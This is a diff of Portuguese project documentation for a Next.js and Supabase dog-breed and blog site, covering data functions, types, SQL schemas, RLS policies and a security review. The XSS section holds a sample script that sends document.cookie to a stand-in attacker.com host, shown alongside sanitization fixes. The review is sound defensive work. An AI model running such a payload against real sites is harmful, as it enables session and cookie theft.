+export async function getPageBySlug(slug: string): Promise<Page | null> {
+  const { data, error } = await supabase
+    .from("pages")
+    .select("*")
+    .eq("slug", slug)
+    .maybeSingle(); 
+
+  if (error) {
+    console.error("Erro ao buscar página:", error.message);
+    return null;
+  }
+
+  return data;
+}
+```
+
+**Usada em:**
+- `app/[slug]/page.tsx`
+- `app/not-found.tsx`
+
+#### `lib/data/breeds.ts`
+
+**Função 1:** `getBreedBySlug(slug: string): Promise<Breed | null>`
+
+**Descrição:** Busca uma raça específica pelo slug
+
+**Parâmetros:**
+- `slug: string` - Slug da raça
+
+**Retorno:**
+- `Promise<Breed | null>` - Raça encontrada ou null
+
+**Usada em:**
+- `app/racas/[slug]/page.tsx`
+
+**Função 2:** `getAllBreeds(): Promise<Breed[]>`
+
+**Descrição:** Busca todas as raças do banco de dados
+
+**Retorno:**
+- `Promise<Breed[]>` - Array de raças (ou array vazio em caso de erro)
+
+**Usada em:**
+- `app/racas/page.tsx`
+
+**Observação:** ⚠️ `lib/data/breeds.ts` cria seu próprio cliente Supabase ao invés de usar o singleton `lib/supabase.ts`. Isso é uma **inconsistência arquitetural**.
+
+### Configuração do Supabase
+
+#### `lib/supabase.ts`
+
+**Export:** `supabase` - Cliente Supabase singleton
+
+**Descrição:** Cliente único compartilhado por toda a aplicação
+
+**Implementação:**
+```typescript
 export const supabase = createClient(
   process.env.NEXT_PUBLIC_SUPABASE_URL!,
   process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!
 );
 ```
 
-**Análise:**
+**⚠️ Problemas:**
+- Não valida variáveis de ambiente (usa `!` para forçar non-null)
+- Pode falhar silenciosamente se variáveis não existirem
 
-1. **✅ Singleton Pattern:** A instância do cliente é criada uma vez e exportada, evitando múltiplas conexões.
-
-2. **⚠️ Variáveis de Ambiente:**
-   - Usa `NEXT_PUBLIC_SUPABASE_URL` e `NEXT_PUBLIC_SUPABASE_ANON_KEY`
-   - O prefixo `NEXT_PUBLIC_` significa que essas variáveis são **expostas ao cliente**
-   - ⚠️ **Não há verificação se as variáveis existem** (usa `!` para forçar non-null)
-
-3. **⚠️ Segurança:**
-   - O `ANON_KEY` é exposto no cliente, o que é **correto** para uso público do Supabase
-   - Para operações sensíveis, seria necessário usar `SERVICE_ROLE_KEY` no servidor (não presente)
-
-### Estrutura da Tabela `pages`
-
-**✅ REFATORADO:** O tipo `Page` foi unificado em `lib/types/pages.ts`.
-
-**Tipo Unificado (Atual):**
-```1:9:lib/types/pages.ts
-export type Page = {
-    id: string
-    slug: string
-    title: string
-    content: string
-    status: "draft" | "published"
-    created_at: string
-    updated_at?: string
-  }
-```
-
-**✅ Mudanças Importantes:**
-
-1. **Campo `content`:** Substitui `description`, `subtitle`, `image_url`, `cta_label`, `cta_link`. Agora o conteúdo é HTML armazenado em um único campo.
-2. **Campo `status`:** Obrigatório, permite controlar publicação.
-3. **Campos de Timestamp:** `created_at` obrigatório, `updated_at` opcional.
-4. **Tipos Não-Nullable:** `slug` e `title` são obrigatórios (não podem ser `null`).
-
-### Campos da Tabela (Atual)
-
-| Campo | Tipo | Obrigatório | Observação |
-|-------|------|-------------|------------|
-| `id` | `string` | ✅ Sim | UUID/Primary Key |
-| `slug` | `string` | ✅ Sim | URL-friendly identifier |
-| `title` | `string` | ✅ Sim | Título da página |
-| `content` | `string` | ✅ Sim | HTML completo do conteúdo |
-| `status` | `"draft" \| "published"` | ✅ Sim | Estado de publicação |
-| `created_at` | `string` | ✅ Sim | Data de criação (ISO string) |
-| `updated_at` | `string` | ❌ Opcional | Data de atualização |
-
-**⚠️ Observação:** O tipo antigo em `services/pages.ts` ainda existe mas não é mais utilizado. Deve ser removido para evitar confusão.
+**Usado em:**
+- `lib/data/pages.ts`
 
 ---
 
-## 🔄 Service Layer - Arquitetura Atualizada
+## 📝 Tipos e Interfaces
 
-### ✅ REFATORAÇÃO COMPLETA: Nova Organização
+### Tipo `Page`
 
-**ANTES:** Duplicação de código entre `services/pages.ts` e `lib/pages.ts`  
-**AGORA:** Organização clara com separação de responsabilidades:
+**Arquivo:** `lib/types/pages.ts`
 
-#### 1. `lib/data/pages.ts` (✅ EM USO)
-
-**Usado em:**
-- `app/[slug]/page.tsx` ✅
-
-**Código:**
-```4:18:lib/data/pages.ts
-export async function getPageBySlug(slug: string): Promise<Page | null> {
-  const { data, error } = await supabase
-    .from("pages")
-    .select("*")
-    .eq("slug", slug)
-    .limit(1)
-    .single()
-
-  if (error) {
-    console.error("getPageBySlug error:", error.message)
-    return null
-  }
-
-  return data
+**Definição:**
+```typescript
+export type Page = {
+  id: string
+  slug: string
+  title: string
+  content: string
+  status: "draft" | "published"
+  image_url?: string | null
+  created_at: string
+  updated_at?: string
 }
 ```
 
-**Características:**
-- ✅ **NÃO filtra por status na query** (permite flexibilidade)
-- ✅ Usa `.limit(1)` antes de `.single()` (melhor prática)
-- ✅ Importa tipo `Page` de `lib/types/pages.ts`
-- ✅ Retorna `null` em caso de erro
-- ⚠️ Log de erro no console
-
-**Estratégia de Filtro:**
-A verificação de `status = "published"` foi **movida para o componente** (`app/[slug]/page.tsx`), permitindo:
-- Buscar páginas draft para preview (futuro)
-- Controle mais granular no nível da rota
-- Maior flexibilidade de uso
-
-#### 2. `lib/types/pages.ts` (✅ EM USO)
+**Campos:**
+- `id: string` - UUID da página
+- `slug: string` - Identificador URL-friendly
+- `title: string` - Título da página
+- `content: string` - HTML completo do conteúdo
+- `status: "draft" | "published"` - Estado de publicação
+- `image_url?: string | null` - URL da imagem (opcional)
+- `created_at: string` - Data de criação (ISO string)
+- `updated_at?: string` - Data de atualização (opcional)
 
 **Usado em:**
-- `lib/data/pages.ts` (retorno da função)
-- `app/[slug]/page.tsx` (tipagem implícita)
+- `lib/data/pages.ts`
+- `app/[slug]/page.tsx`
+- `app/not-found.tsx`
 
-**Código:**
-```1:9:lib/types/pages.ts
-export type Page = {
-    id: string
-    slug: string
-    title: string
-    content: string
-    status: "draft" | "published"
-    created_at: string
-    updated_at?: string
-  }
+### Interface `Article`
+
+**Arquivo:** `lib/data/articles.ts`
+
+**Definição:**
+```typescript
+export interface Article {
+  id?: number;
+  slug: string;
+  title: string;
+  excerpt: string;
+  image: string;
+  image_url: string; // Alias para compatibilidade
+  category: string;
+  author: string;
+  date: string;
+  created_at: string; // Para compatibilidade com componentes
+  readTime: string;
+  content?: string; // Conteúdo HTML do artigo
+}
 ```
 
-**Benefícios:**
-- ✅ **Tipo único e centralizado**
-- ✅ Separação clara: tipos vs. lógica
-- ✅ Facilita manutenção e evolução
+**Campos:**
+- `id?: number` - ID numérico do artigo (opcional)
+- `slug: string` - Identificador URL-friendly
+- `title: string` - Título do artigo
+- `excerpt: string` - Resumo do artigo
+- `image: string` - URL da imagem principal
+- `image_url: string` - Alias para compatibilidade com componentes
+- `category: string` - Categoria do artigo (ex: "Comportamento", "Nutrição", "Saúde")
+- `author: string` - Nome do autor
+- `date: string` - Data formatada (ex: "12 Jan 2024")
+- `created_at: string` - Data em formato ISO (para componentes)
+- `readTime: string` - Tempo estimado de leitura (ex: "5 min")
+- `content?: string` - Conteúdo HTML completo do artigo (opcional)
 
-#### 3. `services/pages.ts` (❌ LEGACY - OBSOLETO)
+**Usado em:**
+- `lib/data/articles.ts`
+- `components/blog/ArticleCard.tsx`
+- `components/home/EditorialHighlights.tsx`
+- `app/blog/page.tsx`
+- `app/blog/[slug]/page.tsx`
+- `app/page.tsx`
 
-**Status:** Não utilizado, deve ser removido.
+### Interface `Breed`
 
-**Problemas:**
-- ❌ Tipo `Page` antigo (campos diferentes)
-- ❌ Não está sendo importado em nenhum lugar ativo
-- ⚠️ Pode causar confusão se não for removido
+**Arquivo:** `lib/data/breeds.ts`
 
-**⚠️ Observação:** `app/not-found.tsx` ainda importa de `@/services/pages`, o que pode causar incompatibilidade de tipos. Deve ser atualizado.
-
-### Nova Arquitetura
-
+**Definição:**
+```typescript
+export interface Breed {
+  id: string;
+  name: string;
+  slug: string;
+  category: string;
+  description: string;
+  image_url: string;
+  characteristics: string[];
+  stats: {
+    label: string;
+    value: number;
+    color: string;
+  }[];
+}
 ```
-app/[slug]/page.tsx
-  └─→ lib/data/pages.ts (getPageBySlug)
-        └─→ lib/types/pages.ts (Page type)
-        └─→ lib/supabase.ts (cliente)
-```
 
-**Vantagens:**
-1. ✅ **Separação de responsabilidades:** Dados, tipos e configuração separados
-2. ✅ **Tipo unificado:** Uma única fonte de verdade para `Page`
-3. ✅ **Flexibilidade:** Filtro de status no componente permite reutilização
-4. ✅ **Manutenibilidade:** Estrutura clara e organizada
+**Campos:**
+- `id: string` - UUID da raça
+- `name: string` - Nome da raça
+- `slug: string` - Identificador URL-friendly
+- `category: string` - Categoria da raça
+- `description: string` - Descrição completa
+- `image_url: string` - URL da imagem
+- `characteristics: string[]` - Array de características
+- `stats: Array<{label, value, color}>` - Estatísticas (personalidade)
+
+**Usado em:**
+- `lib/data/breeds.ts`
+- `components/breeds/BreedCard.tsx`
+- `components/breeds/BreedGrid.tsx`
+- `components/breeds/BreedStats.tsx`
+- `app/racas/page.tsx`
+- `app/racas/[slug]/page.tsx`
 
 ---
 
-## 🔌 Integração Next.js + Supabase
+## 🗄️ Configuração do Supabase
 
-### Fluxo de Dados Completo
+### Estrutura do Banco de Dados
 
-```
-┌─────────────────────────────────────────────────────────────┐
-│ 1. Usuário acessa /sobre                                    │
-└────────────────┬────────────────────────────────────────────┘
-                 │
-                 ▼
-┌─────────────────────────────────────────────────────────────┐
-│ 2. Next.js App Router identifica [slug] = "sobre"          │
-└────────────────┬────────────────────────────────────────────┘
-                 │
-                 ▼
-┌─────────────────────────────────────────────────────────────┐
-│ 3. Carrega app/[slug]/page.tsx (Server Component)          │
-└────────────────┬────────────────────────────────────────────┘
-                 │
-                 ▼
-┌─────────────────────────────────────────────────────────────┐
-│ 4. Chama getPageBySlug("sobre")                             │
-│    Arquivo: lib/data/pages.ts                               │
-└────────────────┬────────────────────────────────────────────┘
-                 │
-                 ▼
-┌─────────────────────────────────────────────────────────────┐
-│ 5. Supabase Client (lib/supabase.ts)                        │
-│    - Lê NEXT_PUBLIC_SUPABASE_URL                            │
-│    - Lê NEXT_PUBLIC_SUPABASE_ANON_KEY                       │
-└────────────────┬────────────────────────────────────────────┘
-                 │
-                 ▼
-┌─────────────────────────────────────────────────────────────┐
-│ 6. Query SQL executada:                                     │
-│    SELECT * FROM pages WHERE slug = 'sobre' LIMIT 1         │
-│    ⚠️ SEM FILTRO DE STATUS (verificação no componente)      │
-└────────────────┬────────────────────────────────────────────┘
-                 │
-                 ▼
-┌─────────────────────────────────────────────────────────────┐
-│ 7. Resposta do Supabase:                                    │
-│    - Se encontrar: retorna Page | null                      │
-│    - Se erro: console.error() + retorna null                │
-└────────────────┬────────────────────────────────────────────┘
-                 │
-                 ▼
-┌─────────────────────────────────────────────────────────────┐
-│ 8. app/[slug]/page.tsx verifica:                            │
-│    if (!page || page.status !== "published") { notFound(); }│
-└────────────────┬────────────────────────────────────────────┘
-                 │
-                 ▼
-┌─────────────────────────────────────────────────────────────┐
-│ 9. Se page === null:                                        │
-│    → notFound() → renderiza app/not-found.tsx               │
-│    Se page existe:                                          │
-│    → renderiza página com dados                             │
-└─────────────────────────────────────────────────────────────┘
+#### Tabela `pages`
+
+**Schema:**
+```sql
+CREATE TABLE pages (
+  id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
+  slug TEXT UNIQUE NOT NULL,
+  title TEXT NOT NULL,
+  content TEXT NOT NULL,
+  status TEXT NOT NULL CHECK (status IN ('draft', 'published')),
+  image_url TEXT,
+  created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
+  updated_at TIMESTAMP WITH TIME ZONE
+);
 ```
 
-### Pontos de Falha Potenciais
+**Índices Recomendados:**
+```sql
+CREATE INDEX idx_pages_slug ON pages(slug);
+CREATE INDEX idx_pages_status ON pages(status);
+```
 
-1. **Variáveis de Ambiente Ausentes:**
-   - Se `NEXT_PUBLIC_SUPABASE_URL` não existir → `undefined` → erro no Supabase
-   - Se `NEXT_PUBLIC_SUPABASE_ANON_KEY` não existir → `undefined` → erro no Supabase
+**Políticas RLS (Row Level Security):**
+- ⚠️ **Verificar se RLS está habilitado**
+- Se habilitado, criar política pública de leitura:
+  ```sql
+  CREATE POLICY "Allow public read access" ON pages
+  FOR SELECT USING (status = 'published');
+  ```
 
-2. **Erro na Query Supabase:**
-   - Qualquer erro (tabela não existe, conexão, permissões) → `error` preenchido → retorna `null` → `notFound()`
+#### Tabela `breeds`
 
-3. **Slug Inexistente:**
-   - Se slug "sobre" não existir na tabela → `data === null` → retorna `null` → `notFound()`
+**Schema (Inferido):**
+```sql
+CREATE TABLE breeds (
+  id UUID PRIMARY KEY,
+  name TEXT NOT NULL,
+  slug TEXT UNIQUE NOT NULL,
+  category TEXT NOT NULL,
+  description TEXT NOT NULL,
+  image_url TEXT NOT NULL,
+  characteristics TEXT[],
+  stats JSONB -- Array de objetos {label, value, color}
+);
+```
 
-4. **Slug com Status "draft":**
-   - ⚠️ **A função atual não filtra por status**, então se existir uma página "sobre" com `status = "draft"`, ela será exibida (ou não, dependendo das políticas RLS do Supabase)
+**Índices Recomendados:**
+```sql
+CREATE INDEX idx_breeds_slug ON breeds(slug);
+CREATE INDEX idx_breeds_category ON breeds(category);
+CREATE INDEX idx_breeds_name ON breeds(name);
+```
 
-### Server Components vs Client Components
+**Políticas RLS:**
+- ⚠️ **Verificar se RLS está habilitado**
+- Criar política pública de leitura:
+  ```sql
+  CREATE POLICY "Allow public read access" ON breeds
+  FOR SELECT USING (true);
+  ```
 
-**Todos os componentes analisados são Server Components:**
+### Cliente Supabase
 
-- ✅ `app/page.tsx` - Server Component
-- ✅ `app/[slug]/page.tsx` - Server Component assíncrono
-- ✅ `app/not-found.tsx` - Server Component assíncrono
-- ✅ `app/layout.tsx` - Server Component
+**Arquivo:** `lib/supabase.ts`
 
-**Vantagens:**
-- Dados são buscados no servidor
-- HTML gerado no servidor (melhor SEO)
-- Sem JavaScript desnecessário no cliente
+**Configuração:**
+- URL: `process.env.NEXT_PUBLIC_SUPABASE_URL`
+- Anon Key: `process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY`
+- Singleton pattern (uma instância compartilhada)
 
-**Desvantagens:**
-- Se houver erro na busca, não há fallback no cliente
-- Erros podem causar 500 ou 404
+**⚠️ Problemas:**
+1. **Falta validação** de variáveis de ambiente
+2. **Inconsistência**: `lib/data/breeds.ts` cria seu próprio cliente
 
 ---
 
-## 🎨 Layout e Componentes
+## 🔒 Análise de Segurança e Vulnerabilidades
 
-### Layout Global
+### Vulnerabilidades Críticas
 
-**Arquivo:** `app/layout.tsx`
+#### 1. ⚠️ XSS (Cross-Site Scripting) - `dangerouslySetInnerHTML`
 
-**Características:**
-- ✅ Define `<html>` e `<body>`
-- ✅ Importa fontes Google (Geist Sans e Geist Mono)
-- ✅ Importa estilos globais (`globals.css`)
-- ✅ Define metadata padrão
-- ✅ **Renderiza header fixo inline** (não usa componente `Header.tsx`)
+**Severidade:** ALTA
 
-**Código do Header:**
-```28:33:app/layout.tsx
-        {/* NAVBAR FIXA DO SITE */}
-        <header className="h-16 border-b">
-          <div className="mx-auto max-w-7xl px-6 h-full flex items-center font-bold">
-            Guia do Cachorro
-          </div>
-        </header>
+**Localização:**
+- `app/[slug]/page.tsx` (linha 26)
+- `app/not-found.tsx` (linha 69)
+
+**Problema:**
+O uso de `dangerouslySetInnerHTML` renderiza HTML diretamente do banco de dados sem sanitização. Se um atacante conseguir inserir HTML malicioso no banco (via SQL injection ou acesso não autorizado), scripts podem ser executados.
+
+**Exemplo de Ataque:**
+```html
+<script>
+  // Roubar cookies, fazer requisições maliciosas, etc.
+  fetch('https://attacker.com/steal?cookie=' + document.cookie)
+</script>
 ```
 
-**⚠️ Observação:**
-- Existe um componente `components/Header.tsx` que **não está sendo usado**
-- O header está implementado diretamente no layout global
-- Ambos renderizam conteúdo similar mas com estilos diferentes
+**Soluções Recomendadas:**
+1. **Sanitizar HTML** antes de renderizar:
+   ```typescript
+   import DOMPurify from 'isomorphic-dompurify';
+   
+   const cleanHTML = DOMPurify.sanitize(page.content);
+   <div dangerouslySetInnerHTML={{ __html: cleanHTML }} />
+   ```
 
-### Componente Header.tsx (Não Utilizado)
+2. **Validar conteúdo** no backend (Supabase) via triggers:
+   ```sql
+   CREATE FUNCTION sanitize_page_content() RETURNS TRIGGER AS $$
+   BEGIN
+     -- Implementar lógica de sanitização
+     RETURN NEW;
+   END;
+   $$ LANGUAGE plpgsql;
+   ```
 
-**Arquivo:** `components/Header.tsx`
+3. **Usar biblioteca de sanitização**: `dompurify`, `sanitize-html`
 
-**Código:**
-```1:18:components/Header.tsx
-export function Header() {
-    return (
-      <header className="w-full border-b border-gray-200">
-        <div className="max-w-7xl mx-auto px-6 py-4 flex items-center justify-between">
-          <h1 className="text-xl font-bold text-gray-900">
-            Guia do Cachorro
-          </h1>
+#### 2. ⚠️ Falta de Validação de Variáveis de Ambiente
+
+**Severidade:** MÉDIA
+
+**Localização:**
+- `lib/supabase.ts` (linhas 4-5)
+- `lib/data/breeds.ts` (linhas 19-20)
+
+**Problema:**
+Variáveis de ambiente não são validadas. Se não existirem, o aplicativo pode falhar de forma silenciosa ou gerar erros confusos.
+
+**Solução:**
+```typescript
+// lib/env.ts
+export function validateEnv() {
+  const url = process.env.NEXT_PUBLIC_SUPABASE_URL;
+  const key = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY;
   
-          <nav className="hidden md:flex gap-6 text-sm font-medium text-gray-600">
-            <a href="#" className="hover:text-blue-600">Raças</a>
-            <a href="#" className="hover:text-blue-600">Saúde</a>
-            <a href="#" className="hover:text-blue-600">Alimentação</a>
-            <a href="#" className="hover:text-blue-600">Blog</a>
-          </nav>
-        </div>
-      </header>
+  if (!url || !key) {
+    throw new Error(
+      'Missing required environment variables: ' +
+      'NEXT_PUBLIC_SUPABASE_URL and/or NEXT_PUBLIC_SUPABASE_ANON_KEY'
     );
   }
+  
+  return { url, key };
+}
+
+// lib/supabase.ts
+import { validateEnv } from './env';
+
+const { url, key } = validateEnv();
+export const supabase = createClient(url, key);
 ```
 
-**Diferenças:**
-- `Header.tsx` tem navegação (links Raças, Saúde, etc.)
-- Layout inline não tem navegação
-- Estilos diferentes (altura, espaçamento)
+#### 3. ⚠️ Exposição de Anon Key no Cliente
 
-### Herança de Layout
+**Severidade:** BAIXA (Esperado para Supabase)
 
-No Next.js App Router, o `app/layout.tsx` é aplicado a **todas as rotas** por padrão, incluindo:
+**Localização:**
+- `lib/supabase.ts`
+- `lib/data/breeds.ts`
 
-- ✅ `/` (home)
-- ✅ `/[slug]` (páginas dinâmicas)
-- ✅ Páginas 404 (quando `notFound()` é chamado)
+**Problema:**
+A `ANON_KEY` é exposta no cliente (prefixo `NEXT_PUBLIC_`). Isso é **esperado** para Supabase, mas requer que:
+- RLS (Row Level Security) esteja habilitado
+- Políticas RLS sejam restritivas
+- Não haja operações sensíveis sem autenticação
 
-Isso significa que o header fixo aparece em todas as páginas, o que é **correto**.
+**Recomendações:**
+- ✅ Verificar se RLS está habilitado em todas as tabelas
+- ✅ Validar políticas RLS
+- ✅ Usar `SERVICE_ROLE_KEY` no servidor para operações sensíveis (não implementado)
+
+#### 4. ⚠️ Falta de Rate Limiting
+
+**Severidade:** MÉDIA
+
+**Problema:**
+Não há rate limiting nas requisições ao Supabase. Um atacante pode fazer muitas requisições e esgotar limites da conta.
+
+**Soluções:**
+1. Implementar rate limiting no Next.js (middleware)
+2. Configurar rate limiting no Supabase
+3. Usar cache para reduzir requisições
+
+### Vulnerabilidades Menores
+
+#### 5. ⚠️ Logs de Erro no Console (Produção)
+
+**Severidade:** BAIXA
+
+**Localização:**
+- `lib/data/pages.ts` (linha 13)
+- `lib/data/breeds.ts` (linhas 31, 46)
+
+**Problema:**
+Logs de erro podem expor informações sensíveis em produção.
+
+**Solução:**
+```typescript
+if (process.env.NODE_ENV === 'development') {
+  console.error("Erro ao buscar página:", error.message);
+}
+// Ou usar sistema de logging adequado (Sentry, etc.)
+```
+
+#### 6. ⚠️ Tratamento de Erro Genérico
+
+**Severidade:** BAIXA
+
+**Localização:**
+- `lib/data/pages.ts`
+- `lib/data/breeds.ts`
+
+**Problema:**
+Todos os erros retornam `null`, dificultando diagnóstico.
+
+**Solução:**
+Diferenciar tipos de erro:
+```typescript
+if (error.code === 'PGRST116') {
+  // Página não encontrada
+  return null;
+} else {
+  // Erro de conexão ou outro
+  throw new Error(`Database error: ${error.message}`);
+}
+```
+
+---
+
+## ✅ Correções e Implementações Recentes
+
+### Implementações Realizadas (Dezembro 2024)
+
+#### 1. ✅ Sistema de Blog Implementado
+
+**O que foi feito:**
+- ✅ Criadas rotas `/blog` e `/blog/[slug]`
+- ✅ Implementada interface `Article` completa
+- ✅ Criadas funções `getAllArticles()`, `getFeaturedArticles()`, `getArticleBySlug()`
+- ✅ Criado componente `ArticleCard` para exibição de artigos
+- ✅ Integrado blog na página inicial (EditorialHighlights)
+- ✅ Implementada página de detalhes do artigo com renderização HTML
+
+**Status:** Funcionando com dados estáticos
+
+**Próximos Passos:**
+- [ ] Migrar para Supabase (tabela `articles`)
+- [ ] Implementar sanitização HTML (DOMPurify)
+- [ ] Adicionar busca e filtros
+
+#### 2. ✅ Navegação Atualizada
+
+**O que foi feito:**
+- ✅ Menu "Curiosidades" substituído por "Blog"
+- ✅ Link atualizado para `/blog`
+- ✅ Header atualizado em `components/layout/Header.tsx`
+
+**Status:** Implementado e funcionando
+
+#### 3. ✅ Correção de Bugs
+
+**O que foi feito:**
+- ✅ Função `getAllArticles()` criada (corrigido erro de export não encontrado)
+- ✅ Interface `Article` atualizada com todos os campos necessários
+- ✅ Dados de artigos completos com `id`, `image_url`, `created_at`, `content`
+- ✅ Componente `ArticleCard` funcionando corretamente
+
+**Status:** Todos os bugs corrigidos
+
+#### 4. ✅ Limpeza de Código
+
+**O que foi feito:**
+- ✅ Componentes legacy removidos (`components/Header.tsx`, `components/Footer.tsx`)
+- ✅ Estrutura de pastas organizada (`components/home/`, `components/blog/`, `components/layout/`)
+
+**Status:** Código limpo e organizado
 
 ---
 
 ## 🐛 Problemas Identificados
 
-### 🔴 Problemas Críticos
+### Problemas Críticos
 
-#### 1. **Arquivo Legacy `services/pages.ts` Não Removido** ✅ RESOLVIDO PARCIALMENTE
-- **Severidade:** MÉDIA
-- **Status:** Refatoração realizada, mas arquivo antigo ainda existe
-- **Arquivo:** `services/pages.ts`
-- **Impacto:** Confusão sobre qual arquivo usar, possível importação acidental
-- **Solução Recomendada:** Remover `services/pages.ts` após confirmar que não é mais usado
+#### 1. 🔴 Inconsistência no Cliente Supabase
 
-#### 2. **`app/not-found.tsx` Usa Importação Legacy** ⚠️ PENDENTE
-- **Severidade:** MÉDIA
-- **Arquivo:** `app/not-found.tsx`
-- **Impacto:** Incompatibilidade de tipos (`Page` antigo vs. novo), possíveis erros em runtime
-- **Solução Recomendada:** Atualizar para importar de `@/lib/data/pages` e ajustar código para novo tipo `Page`
+**Severidade:** MÉDIA
 
-#### 3. **Filtro de Status no Componente** ✅ IMPLEMENTADO
-- **Severidade:** ✅ RESOLVIDO
-- **Status:** Verificação de `status !== "published"` agora ocorre no componente `app/[slug]/page.tsx`
-- **Observação:** Decisão arquitetural - permite flexibilidade futura para preview de drafts
+**Problema:**
+- `lib/data/pages.ts` usa `lib/supabase.ts` (singleton)
+- `lib/data/breeds.ts` cria seu próprio cliente Supabase
 
-#### 4. **Variáveis de Ambiente Sem Validação**
-- **Severidade:** MÉDIA
-- **Arquivo:** `lib/supabase.ts`
-- **Impacto:** Se variáveis não existirem, a aplicação quebra silenciosamente
-- **Solução Recomendada:** Validar variáveis no início da aplicação
+**Impacto:**
+- Duplicação de código
+- Possível inconsistência de configuração
+- Dificulta manutenção
 
-#### 5. **Tipo `Page` Unificado** ✅ RESOLVIDO
-- **Severidade:** ✅ RESOLVIDO
-- **Status:** Tipo centralizado em `lib/types/pages.ts`
-- **Benefício:** Uma única fonte de verdade, tipagem consistente
+**Solução:**
+Refatorar `lib/data/breeds.ts` para usar `lib/supabase.ts`:
+```typescript
+// lib/data/breeds.ts
+import { supabase } from "@/lib/supabase"; // ✅ Usar singleton
 
-### 🟡 Problemas Menores
+// Remover:
+// const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL!;
+// const supabaseKey = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!;
+// const supabase = createClient(supabaseUrl, supabaseKey);
+```
 
-#### 6. **Componente `Header.tsx` Não Utilizado**
-- **Severidade:** BAIXA
-- **Impacto:** Código morto, confusão sobre qual header usar
-- **Solução Recomendada:** Remover ou migrar para uso no layout
+#### 2. 🔴 Componentes Legacy Removidos ✅
 
-#### 7. **Logs de Erro no Console (Produção)**
-- **Severidade:** BAIXA
-- **Arquivo:** `lib/data/pages.ts`
-- **Impacto:** Poluição de logs, possível exposição de informações sensíveis
-- **Solução Recomendada:** Usar sistema de logging adequado (ex: Sentry, LogRocket)
+**Status:** RESOLVIDO
 
-#### 8. **Tratamento de Erro Genérico**
-- **Severidade:** MÉDIA
-- **Arquivo:** `lib/data/pages.ts`
-- **Impacto:** Qualquer erro do Supabase retorna `null`, tornando debugging difícil
-- **Solução Recomendada:** Diferenciar entre "página não encontrada" e "erro de conexão"
+**Correção Realizada:**
+- `components/Header.tsx` - Removido ✅
+- `components/Footer.tsx` - Removido ✅
+- Componentes agora estão apenas em `components/layout/`
 
-#### 9. **Página `not-found.tsx` Depende do Supabase**
-- **Severidade:** MÉDIA
-- **Arquivo:** `app/not-found.tsx`
-- **Impacto:** Se o Supabase estiver offline, a página 404 pode não funcionar
-- **Solução Recomendada:** Fallback local caso a busca falhe
+#### 3. ✅ Navegação Atualizada
+
+**Status:** IMPLEMENTADO
+
+**Mudança Realizada:**
+- Menu "Curiosidades" foi substituído por "Blog" ✅
+- Link agora aponta para `/blog` ✅
+- Navegação atualizada em `components/layout/Header.tsx` ✅
+
+### Problemas Menores
+
+#### 4. 🟡 Configuração Duplicada no `next.config.ts`
+
+**Severidade:** BAIXA
+
+**Problema:**
+Hostname `images.unsplash.com` aparece duplicado com aspas extras na linha 21:
+```typescript
+hostname: "images.unsplash.com'", // ⚠️ Aspa extra
+```
+
+**Solução:**
+Remover duplicação e corrigir aspas:
+```typescript
+{
+  protocol: "https",
+  hostname: "images.unsplash.com", // ✅ Corrigido
+}
+```
+
+#### 5. 🟡 Falta de Validação de Tipos em Tempo de Execução
+
+**Severidade:** BAIXA
+
+**Problema:**
+Dados do Supabase são assumidos como corretos sem validação.
+
+**Solução:**
+Usar bibliotecas de validação (Zod, Yup):
+```typescript
+import { z } from 'zod';
+
+const PageSchema = z.object({
+  id: z.string().uuid(),
+  slug: z.string(),
+  title: z.string(),
+  // ...
+});
+
+const page = PageSchema.parse(data);
+```
 
 ---
 
-## 🔍 Hipóteses para o Erro 404 em `/[slug]`
+## 📋 Pendências e Tarefas
 
-Quando você acessa `/sobre` e recebe um 404, o fluxo é:
+### Tarefas Urgentes (Prioridade Alta)
 
-```
-/sobre → app/[slug]/page.tsx → getPageBySlug("sobre") → null → notFound() → not-found.tsx
-```
+- [ ] **Corrigir vulnerabilidade XSS** - Implementar sanitização de HTML
+  - [ ] Instalar `dompurify` ou `isomorphic-dompurify`
+  - [ ] Sanitizar `page.content` antes de renderizar
+  - [ ] Atualizar `app/[slug]/page.tsx`
+  - [ ] Atualizar `app/not-found.tsx`
 
-### Hipóteses (Ordenadas por Probabilidade)
+- [ ] **Unificar cliente Supabase** - Refatorar `lib/data/breeds.ts`
+  - [ ] Remover criação de cliente duplicado
+  - [ ] Importar `supabase` de `lib/supabase.ts`
+  - [ ] Testar funcionalidade de raças
 
-#### 🎯 **Hipótese 1: Slug "sobre" Não Existe no Banco de Dados**
-**Probabilidade:** 80%
+- [ ] **Validar variáveis de ambiente** - Criar validação
+  - [ ] Criar `lib/env.ts` com função `validateEnv()`
+  - [ ] Atualizar `lib/supabase.ts`
+  - [ ] Adicionar validação no build (via `next.config.ts`)
 
-**Cenário:**
-- A tabela `pages` no Supabase não possui uma linha com `slug = "sobre"`
-- A query retorna `data = null`
-- A função retorna `null`
-- O componente chama `notFound()`
+### Tarefas Importantes (Prioridade Média)
 
-**Como Verificar:**
-```sql
-SELECT * FROM pages WHERE slug = 'sobre';
-```
+- [x] **Limpar código duplicado** ✅
+  - [x] Remover `components/Header.tsx` ✅
+  - [x] Remover `components/Footer.tsx` ✅
 
-**Solução:**
-- Criar a página "sobre" no Supabase
-- Verificar se o slug está correto (case-sensitive)
+- [x] **Sistema de Blog implementado** ✅
+  - [x] Criar rotas `/blog` e `/blog/[slug]` ✅
+  - [x] Criar componente `ArticleCard` ✅
+  - [x] Criar interface `Article` ✅
+  - [x] Implementar funções `getAllArticles()`, `getFeaturedArticles()`, `getArticleBySlug()` ✅
+  - [x] Atualizar página inicial para usar artigos ✅
+  - [x] Atualizar navegação (Curiosidades → Blog) ✅
+  - [x] Corrigir bug de export não encontrado (`getAllArticles`) ✅
+  - [x] Limpar componentes legacy ✅
 
-#### 🎯 **Hipótese 2: Variáveis de Ambiente Não Configuradas**
-**Probabilidade:** 60%
+- [ ] **Corrigir vulnerabilidade XSS no blog**
+  - [ ] Implementar sanitização HTML em `app/blog/[slug]/page.tsx`
+  - [ ] Instalar `isomorphic-dompurify`
 
-**Cenário:**
-- `NEXT_PUBLIC_SUPABASE_URL` está ausente ou incorreto
-- `NEXT_PUBLIC_SUPABASE_ANON_KEY` está ausente ou incorreto
-- O cliente Supabase não consegue conectar
-- Qualquer query retorna erro → `null`
